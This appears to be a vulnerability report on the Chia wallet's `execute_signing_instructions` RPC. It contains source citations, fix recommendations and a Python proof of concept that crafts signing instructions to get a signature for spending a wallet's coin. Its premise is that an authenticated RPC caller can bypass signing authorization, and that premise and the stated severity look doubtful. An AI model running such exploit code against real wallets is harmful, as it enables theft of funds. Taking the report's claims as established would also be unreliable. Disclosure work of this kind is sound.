### Title
Unconstrained `SumHint.synthetic_offset` Injection Enables Arbitrary Message Signing with Wallet's Legitimate Keys — (`chia/wallet/wallet.py`)

### Summary

`execute_signing_instructions` unconditionally derives a `PrivateKey` from the caller-supplied `SumHint.synthetic_offset` and inserts it into `sk_lookup`, and also inserts the caller-supplied `final_pubkey` into `pk_lookup` without verifying that `final_pubkey` equals the actual sum of the component public keys. Because `calculate_synthetic_offset` is a public, deterministic function, any RPC caller can supply the wallet's own legitimate synthetic offset and synthetic pubkey in a crafted `SumHint`, causing the wallet to produce a valid BLS aggregate signature under the wallet's real synthetic pubkey for an attacker-chosen message.

### Finding Description

In `chia/wallet/wallet.py`, `execute_signing_instructions` processes `SumHint` entries as follows: [1](#0-0) 

Lines 595–598 unconditionally convert `sum_hint.synthetic_offset` (fully attacker-controlled) into a `PrivateKey`/`G1Element` pair and insert them into `sk_lookup`/`pk_lookup`. Lines 599–602 insert the attacker-supplied `final_pubkey` into `pk_lookup` and record the component fingerprints in `sum_hint_lookup` — **with no check that `final_pubkey` equals the arithmetic sum of the component public keys**.

When a `SigningTarget` whose fingerprint matches `final_fingerprint` is processed, the wallet signs the attacker-chosen `target.message` with every key in `sum_hint_lookup[final_fingerprint]`, augmented with `pk_lookup[final_fingerprint]` (the attacker-supplied `final_pubkey`): [2](#0-1) 

Because `calculate_synthetic_offset` is a public, deterministic function of `(child_pk, hidden_puzzle_hash)`: [3](#0-2) 

an attacker can compute the exact `synthetic_offset` and `synthetic_pk` for any wallet address they observe on-chain, then supply them verbatim in a crafted `SumHint`. The wallet will then co-sign the attacker's message with `child_sk` (obtained via a `PathHint`) and `offset_sk` (injected via `synthetic_offset`), producing a valid BLS aggregate signature under the wallet's real `synthetic_pk`.

The RPC endpoint is exposed with no additional authorization beyond the RPC certificate: [4](#0-3) 

### Impact Explanation

The attacker obtains a valid `AugSchemeMPL` aggregate signature under the wallet's legitimate `synthetic_pk` for an arbitrary message. By choosing `message = delegated_puzzle_hash + coin_id + AGG_SIG_ME_ADDITIONAL_DATA` (all values the attacker can compute from public chain data), the attacker can satisfy the `AGG_SIG_ME` condition in any standard p2_delegated_or_hidden coin locked by that `synthetic_pk`, enabling unauthorized coin spend. This is a **High** impact: bypass of wallet signing authorization enabling unauthorized coin control.

### Likelihood Explanation

Any application with wallet RPC access (e.g., a DApp, a CLI tool, a malicious plugin) can call `execute_signing_instructions` directly. The attack requires only public on-chain data (child pubkey, coin ID) and a single RPC call. No key material needs to be leaked. Likelihood is **Medium-High** given that RPC access is routinely granted to third-party applications.

### Recommendation

1. **Validate `final_pubkey`**: After collecting all component public keys (from `fingerprints_we_have` and `offset_pk`), assert that `final_pubkey == sum(component_pks)` before inserting into `pk_lookup`/`sum_hint_lookup`. Reject the `SumHint` if the check fails.
2. **Restrict `synthetic_offset` insertion**: Only insert `offset_sk`/`offset_pk` into `sk_lookup`/`pk_lookup` if the resulting `final_pubkey` is cryptographically consistent with the component keys the wallet actually controls.
3. **Scope signing to wallet-owned targets**: Before signing any `SigningTarget`, verify that the target fingerprint corresponds to a key or address the wallet itself generated (e.g., cross-check against the puzzle store).

### Proof of Concept

```python
# Attacker knows: root_pk (public), child_pk at index i (on-chain), coin to steal
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import (
    calculate_synthetic_offset, calculate_synthetic_public_key, DEFAULT_HIDDEN_PUZZLE_HASH
)
from chia.wallet.signer_protocol import SigningInstructions, KeyHints, SumHint, PathHint, SigningTarget

# Step 1: compute wallet's legitimate synthetic key (all public info)
synthetic_offset_int = calculate_synthetic_offset(child_pk, DEFAULT_HIDDEN_PUZZLE_HASH)
synthetic_offset_bytes = synthetic_offset_int.to_bytes(32, "big")
synthetic_pk = calculate_synthetic_public_key(child_pk, DEFAULT_HIDDEN_PUZZLE_HASH)

# Step 2: craft the attacker's message (spend coin to attacker's address)
message = delegated_puzzle_hash + coin_id + AGG_SIG_ME_ADDITIONAL_DATA

# Step 3: submit malicious SigningInstructions
malicious_instructions = SigningInstructions(
    KeyHints(
        sum_hints=[SumHint(
            fingerprints=[child_pk.get_fingerprint().to_bytes(4, "big")],
            synthetic_offset=synthetic_offset_bytes,   # legitimate offset, publicly computable
            final_pubkey=bytes(synthetic_pk),           # wallet's real synthetic pk
        )],
        path_hints=[PathHint(
            root_fingerprint=root_pk.get_fingerprint().to_bytes(4, "big"),
            path=[12381, 8444, 2, i],                  # standard derivation path
        )],
    ),
    targets=[SigningTarget(
        fingerprint=synthetic_pk.get_fingerprint().to_bytes(4, "big"),
        message=message,   # attacker-chosen message
        hook=hook,
    )],
)

# Step 4: wallet returns valid sig under synthetic_pk for attacker's message
responses = await wallet_rpc.execute_signing_instructions(
    ExecuteSigningInstructions(signing_instructions=malicious_instructions)
)
# AugSchemeMPL.verify(synthetic_pk, message, G2Element.from_bytes(responses[0].signature)) == True
# Attacker uses this signature to spend the victim's coin.
```

The wallet signs `message` with `child_sk` and `offset_sk` (both now in `sk_lookup`), augmented with `synthetic_pk`. Because `synthetic_pk = child_pk + offset_pk`, the BLS aggregate verifies correctly under `synthetic_pk`, satisfying the `AGG_SIG_ME` condition on the victim's coin.

### Citations

**File:** chia/wallet/wallet.py (L594-602)
```python
            # Add any synthetic offsets as keys we "have"
            offset_sk = PrivateKey.from_bytes(sum_hint.synthetic_offset)
            offset_pk = offset_sk.get_g1()
            pk_lookup[offset_pk.get_fingerprint()] = offset_pk
            sk_lookup[offset_pk.get_fingerprint()] = offset_sk
            final_pubkey: G1Element = G1Element.from_bytes(sum_hint.final_pubkey)
            final_fingerprint: int = final_pubkey.get_fingerprint()
            pk_lookup[final_fingerprint] = final_pubkey
            sum_hint_lookup[final_fingerprint] = [*fingerprints_we_have, offset_pk.get_fingerprint()]
```

**File:** chia/wallet/wallet.py (L619-641)
```python
            else:  # Implicit if pk_fingerprint in sum_hint_lookup
                signatures: list[G2Element] = []
                for partial_fingerprint in sum_hint_lookup[pk_fingerprint]:
                    signatures.append(
                        AugSchemeMPL.sign(sk_lookup[partial_fingerprint], target.message, pk_lookup[pk_fingerprint])
                    )
                if partial_allowed:
                    # In multisig scenarios, we return everything as a component signature
                    for sig in signatures:
                        responses.append(
                            SigningResponse(
                                bytes(sig),
                                target.hook,
                            )
                        )
                else:
                    # In the scenario where we are the only signer, we can collapse many responses into one
                    responses.append(
                        SigningResponse(
                            bytes(AugSchemeMPL.aggregate(signatures)),
                            target.hook,
                        )
                    )
```

**File:** chia/wallet/puzzles/p2_delegated_puzzle_or_hidden_puzzle.py (L87-91)
```python
def calculate_synthetic_offset(public_key: G1Element, hidden_puzzle_hash: bytes32) -> int:
    blob = hashlib.sha256(bytes(public_key) + hidden_puzzle_hash).digest()
    offset = int_from_bytes(blob)
    offset %= GROUP_ORDER
    return offset
```

**File:** chia/wallet/wallet_rpc_api.py (L3738-3747)
```python
    @marshal
    async def execute_signing_instructions(
        self,
        request: ExecuteSigningInstructions,
    ) -> ExecuteSigningInstructionsResponse:
        return ExecuteSigningInstructionsResponse(
            signing_responses=await self.service.wallet_state_manager.execute_signing_instructions(
                request.signing_instructions, request.partial_allowed
            )
        )
```
